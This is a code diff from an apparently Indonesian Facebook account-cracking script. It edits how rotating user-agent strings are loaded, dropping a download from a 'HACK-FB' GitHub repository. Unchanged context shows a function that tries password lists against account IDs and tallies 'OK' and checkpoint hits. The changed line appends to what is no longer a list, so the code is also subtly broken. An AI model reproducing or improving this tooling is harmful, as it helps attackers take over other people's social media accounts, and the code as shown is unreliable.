@@ -180,18 +180,7 @@ def ugen_hp():
     jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O));print('%s║'%(O));input('%s╚══[ %sKembali %s]%s'%(O,P,O,P));login()
 
 
-def uaku():
-    try:
-        ua=open('bbnew.txt','r').read().splitlines()
-        for ub in ua:
-            free.append(ub)
-    except:
-        a=requests.get('https://github.com/Rudal-XD/HACK-FB/blob/main/bbnew.txt').text
-        ua=open('bbnew.txt','w')
-        aa=re.findall('line">(.*?)<',str(a))
-        for un in aa:
-            ua.write(un+'\n')
-        ua=open('bbnew.txt','r').read().splitlines()
+
 #------------[ INDICATION ]---------------#
 M2 = "[#FF0000]" # MERAH
 H2 = "[#00FF00]" # HIJAU
@@ -1402,8 +1391,8 @@ def reguler(idf,pwv):
 	rr = random.randint
 	prog.update(des,description=f" {K2}•{H2} REGULER {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
 	prog.advance(des)
-	#ua  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-	ua=random.choice(free)
+	uapo=open('bbnew.txt','r').read()
+	ua.append(uapo)
 	ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
